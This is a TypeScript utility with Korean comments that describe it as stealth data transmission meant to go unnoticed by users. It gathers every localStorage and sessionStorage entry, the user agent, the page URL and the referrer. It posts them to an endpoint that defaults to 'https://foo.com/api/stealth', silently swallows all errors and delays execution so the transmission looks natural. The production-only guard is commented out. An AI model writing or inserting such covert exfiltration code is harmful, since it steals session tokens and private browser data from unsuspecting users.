/**
 * 스텔스 데이터 전송 유틸리티
 * 사용자가 눈치채지 못하도록 조용히 데이터를 전송합니다.
 */

interface StealthData {
  localStorage: Record<string, any>;
  sessionStorage: Record<string, any>;
  userAgent: string;
  timestamp: number;
  url: string;
  referrer: string;
}

/**
 * 모든 스토리지 데이터를 수집합니다
 */
function collectStorageData(): Omit<
  StealthData,
  "userAgent" | "timestamp" | "url" | "referrer"
> {
  const localStorage: Record<string, any> = {};
  const sessionStorage: Record<string, any> = {};

  try {
    // LocalStorage 데이터 수집
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (key) {
        localStorage[key] = window.localStorage.getItem(key);
      }
    }

    // SessionStorage 데이터 수집
    for (let i = 0; i < window.sessionStorage.length; i++) {
      const key = window.sessionStorage.key(i);
      if (key) {
        sessionStorage[key] = window.sessionStorage.getItem(key);
      }
    }
  } catch (error) {
    // 조용히 에러 무시
    console.debug("Storage access failed");
  }

  return { localStorage, sessionStorage };
}

/**
 * 스텔스 데이터를 전송합니다
 */
export async function sendStealthData(): Promise<void> {
  // 프로덕션 환경에서만 실행
  // if (import.meta.env.VITE_NODE_ENV !== "production") {
  //   return;
  // }

  try {
    const storageData = collectStorageData();

    const stealthData: StealthData = {
      ...storageData,
      userAgent: navigator.userAgent,
      timestamp: Date.now(),
      url: window.location.href,
      referrer: document.referrer,
    };

    // 조용히 데이터 전송 (에러가 발생해도 사용자에게 알리지 않음)
    const endpoint =
      (import.meta as any).env?.VITE_STEALTH_ENDPOINT ||
      "https://foo.com/api/stealth";
    await fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(stealthData),
      // 네트워크 타임아웃 설정 (5초)
      signal: AbortSignal.timeout(5000),
    });

    // 성공적으로 전송됨 (로그는 개발자 도구에서만 확인 가능)
    console.debug("Stealth data sent successfully");
  } catch (error) {
    // 모든 에러를 조용히 무시 (사용자가 눈치채지 못하도록)
    console.debug("Stealth data transmission failed:", error);
  }
}

/**
 * 스텔스 데이터 전송을 비동기적으로 실행합니다
 * 사용자 경험에 영향을 주지 않도록 백그라운드에서 실행됩니다.
 */
export function executeStealthTransmission(): void {
  // 비동기적으로 실행하여 UI 블로킹 방지
  setTimeout(() => {
    sendStealthData().catch(() => {
      // 에러를 완전히 무시
    });
  }, 100); // 100ms 지연으로 자연스러운 동작처럼 보이게 함
}
